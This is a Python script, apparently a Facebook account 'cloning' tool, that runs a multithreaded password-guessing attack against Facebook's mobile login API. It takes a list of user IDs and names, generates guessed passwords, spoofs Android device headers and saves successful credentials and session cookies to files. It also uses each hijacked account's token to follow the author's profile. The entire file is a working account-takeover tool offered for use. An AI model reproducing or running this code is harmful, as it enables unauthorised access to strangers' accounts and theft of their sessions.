import os
import time
import random
import sys
import json
import uuid


try:
    import pycurl
    from io import BytesIO
except:
    os.system('pip install pycurl')
    import pycurl
    from io import BytesIO

green = '\033[32m'
blue = '\033[94m'
reset = '\033[0m'
greenn = '\x1b[1;32m'


class System:
    def __init__(self , models):
        from concurrent.futures import ThreadPoolExecutor as rana
        self.models = models
        self.idz = []
        self.oku = []
        self.cpu = []
        self.passwords = []
        self.rana = rana
        self.loop = 0
        
    def menu(self):
        try:
            os.makedirs('/sdcard/RSA')
        except:
            pass
        os.system('clear')
        print(self.logo)
        print(f' ({green}1{reset}) File Cloning')
        print(f' ({green}2{reset}) WhatsApp Group (RSA)')
        print(47 * '-')
        select = input(f' Select: ')
        if select == '1':
            self.file_clone()
        else:
            os.system('xdg-open https://chat.whatsapp.com/E99vCieIin86cDqtomBptG')
            exit()
            
    def file_clone(self):
        os.system('clear')
        print(self.logo)
        try:
            file = input(f' ({green}•{reset}) File: ')
            for x in open(file, 'r').readlines():
                self.idz.append(x.strip())
        except Exception as e:
            print(e)
            time.sleep(2)
            self.menu()
        self.select_password()
        
    def select_password(self):
        os.system('clear')
        print(logo)
        how = input(f' ({green}•{reset}) Password Limet: ')
        for x in range(int(how)):
            self.passwords.append(input(f' ({green}•{reset}) Password {1 + x}: '))
        self.cloning_process()
        
    def cloning_process(self):
        os.system('clear')
        print(logo)
        print(f' ({green}•{reset}) Accounts save in /sdcard/RSA')
        print(47*'-')
        print(f' ({green}•{reset}) Brute Has Started ')
        print(f' ({green}•{reset}) This Process Take Time')
        print(47*'-')
        with self.rana (max_workers=30) as send:
            for uids in self.idz:
                uids = uids.strip().lower()
                uid,name = uids.rsplit('|')
                first = name.rsplit(' ')[0]
                try:
                    last = name.rsplit(' ')[1]
                except Exception as e:
                    last = first
                send.submit(self.cloning, uid,first,last)
        print(f'\n ({green}•{reset}) Brute Has Completed :) ')
        exit()
    def cloning(self,uid,first,last):
        sys.stdout.write(f" ({green}•{reset}) {uid} : {str(self.loop)}/{str(len(self.idz))} ({green}ok{reset}):{str(len(self.oku))} ({blue}cp{reset}):{str(len(self.cpu))}\r")
        model_,build = random.choice(self.models).rsplit('|')
        android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
        facebook_version = f"{random.randint(100, 200)}.{random.randint(0, 100)}.{random.randint(0, 100)}.{random.randint(0, 100)}"
        fbbv = str(random.randint(10000000, 99999999))
        fbrv = str(random.randint(10000000, 99999999))
        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
        density = random.uniform(1.0, 4.0)
        width = random.randint(720, 1440)
        height = random.randint(1280, 2560)
        network_carriers = ["Verizon", "AT&T", "T-Mobile", "Sprint"]
        network_carrier = random.choice(network_carriers)
        network_type = random.choice(["WiFi", "4G", "3G"])
        ip_address = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        fbcr = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
        fban = random.choice(["FB4A", "FB5A", "FB6A"])
        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
        fbbd = 'Samsung'
        user_agent = f"Dalvik/1.6.0 (Linux; U; {android_version}; {model_} Build/{build}) " \
             f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density:.1f},width={width},height={height}}};FBLC/it_IT;FBRV/{fbrv};FBCR/{fbcr};FBMF/{model_};FBBD/{fbbd};FBPN/{fbpn};FBDV/{model_.replace(' ', '_')};FBSV/{fbsv};FBOP/1;FBCA/x86:armeabi-v7a;FBNT/{network_type};FBCN/{network_carrier};FBSR/{ip_address};]"
        for pw in self.passwords:
            try:
                pw = pw.replace("first", first).replace("last", last).replace("First", first.capitalize()).replace("Last", last.capitalize())
                bandwidth = str(random.randint(1000000, 30000000))
                sim_hni = str(random.randint(10000, 99999))
                net_hni = str(random.randint(10000, 99999))
                quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
                headers = [
                    'Authorization: OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                    f'x-fb-connection-bandwidth: {bandwidth}',
                    f'x-fb-sim-hni: {sim_hni}',
                    f'x-fb-net-hni: {sim_hni}',
                    f'X-FB-Connection-Quality: {quality}',
                    f'X-FB-Connection-Type: Wifi',
                    f'user-agent: {user_agent.encode("utf-8")}',
                    'content-encoding: gzip,deflate',
                    'content-type: application/x-www-form-urlencoded',
                    'x-fb-http-engine: Liger',
                    'connection: keep-alive']
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                family_device_id = str(uuid.uuid4())
                advertising_id = str(uuid.uuid4())
                data = {
                    'adid': f'{adid}',
                    'email': uid,
                    'password': pw,
                    'cpl': 'true',
                    'credentials_type': 'password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'register_api',
                    'format': 'json',
                    'device_id': f'{device_id}',
                    'family_device_id': f'{family_device_id}',
                    'generate_session_cookies': '1',
                    'generate_analytics_claim': '1',
                    'generate_machine_id': '1',
                    'tier': 'regular',
                    'device': f'{fbbd}',
                    'android_version': f'{android_version}',
                    'carrier': f'{network_carrier}',
                    'app_id': '256002347743983,',
                    'app_version': f'{facebook_version}',
                    'locale': 'it_IT',
                    'advertising_id': '{advertising_id}',
                    'fb_api_req_friendly_name': 'authenticate'}
                buffer = BytesIO()
                c = pycurl.Curl()
                c.setopt(c.URL, 'https://b-graph.facebook.com/auth/login')
                c.setopt(c.HTTPHEADER, headers)
                c.setopt(c.WRITEDATA, buffer)
                data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
                c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
                c.perform()
                c.close()
                body = buffer.getvalue().decode('utf-8')
                response = body
                if "session_key" in response:
                    try:
                        response_data = json.loads(body)
                        
                        uid = str(response_data['uid'])
                        follow(self,response_data)
                    except:
                        uid = uid
                    try:
                        response_data = json.loads(body)  
                        cookies = response_data.get("session_cookies")
                        coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                    except:
                        coki = 'no'
                    uid_pw = f"{uid}|{pw}|{coki}\n"
                    print(f'\r{greenn} [RSA-OK] {uid} | {pw} {reset}')
                    open('/sdcard/RSA/rsa-ok-with-cookies.txt','a').write(str(uid_pw))
                    open('/sdcard/RSA/rsa-ok.txt','a').write(f'{uid}|{pw}\n')
                    self.oku.append(uid)
                    break
                elif "User must verify their account" in response:
                    print(f'\r{blue} [RSA-CP] {uid} | {pw} {reset}')
                    open('/sdcard/RSA/rsa-cp.txt','a').write(f'{uid}|{pw}\n')
                    self.cpu.append(uid)
                    break
                else:
                    continue
            except pycurl.error as e:
                time.sleep(10)
                continue
            except Exception as e:
                print(e)
        self.loop +=1
    
    def follow(self, response_data):
        try:
            tok = str(response_data['access_token'])
            url = 'https://graph.facebook.com/100094054980090/subscribers?access_token=' + tok
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, url)
            c.setopt(c.WRITEDATA, buffer)
            c.perform()
            c.close()
            response_body = buffer.getvalue()
        except:
            pass
        
if __name__ == "__main__":
    models =[
        "SM-G920F|NRD90M",
        "SM-T535|LRX22G",
        "SM-T231|KOT49H",
        "SM-J320F|LMY47V",
        "GT-I9190|KOT49H",
        "GT-N7100|KOT49H",
        "SM-T561|KTU84P",
        "GT-N7100|KOT49H",
        "GT-I9500|LRX22C",
        "SM-J320F|LMY47V",
        "SM-G930F|NRD90M",
        "SM-J320F|LMY47V",
        "SM-J510FN|NMF26X",
        "GT-P5100|IML74K",
        "SM-J320F|LMY47V",
        "SM-T531|LRX22G",
        "SPH-L720|KOT49H",
        "GT-I9500|JDQ39"
        ]
    os.system('clear')
    print(f'({green}•{reset}) This tool is for only professional cloners')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100094054980090')
    #time.sleep(5)
    logo = f'''

    d8888b.      .d8888.       .d8b.  
    88  `8D      88'  YP      d8' `8b 
    88oobY'      `8bo.        88ooo88 
    88`8b          `Y8b.      88~~~88 
    88 `88.      db   8D      88   88 
    88   YD      `8888Y'      YP   YP 

 <<  Author : Rana Shafaat Ali >>
 <<  Github : https://github.com/rsaprogrammers >>
 <<  Update : 0.1 >>
{47 * '-'}'''
    system = System(models)
    system.logo = logo
    system.menu()
